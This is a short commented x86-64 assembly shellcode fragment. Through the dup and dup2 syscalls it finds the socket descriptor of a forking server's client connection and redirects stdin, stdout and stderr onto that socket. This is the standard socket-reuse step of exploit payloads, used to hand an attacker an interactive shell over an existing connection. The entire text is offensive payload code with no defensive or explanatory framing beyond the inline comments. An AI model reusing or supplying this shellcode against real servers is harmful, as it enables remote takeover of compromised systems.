; this is a syscode hat makes a forking server redirect stdin, stdout and stderr to a supposed fd that should be the one of the socket connection
; dup is used to duplicate stdin into a newfd that gets decremented in order to get back the socket fd (if server not busy)
; dup2 is used to connect the socket fd to also the stdin, stdout, stderr
mov rax, 0x20 	; dup
mov rdi, 0x00 	; stdin
syscall		; dup(stdin)
mov rdi, rax	; get the new fd
dec rdi		; get socket fd
mov rax, 0x21	; dup2
mov rsi, 0x00	; stdin
syscall		; dup2(socketfd, stdin)
mov rax, 0x21	; dup2 overwritten by last syscall
mov rsi, 0x01	; stdout
syscall		; dup2(socketfd, stdout)
mov rax, 0x21	; dup2
mov rsi, 0x02	; stderr
syscall		; dup2(socketfd, stderr)
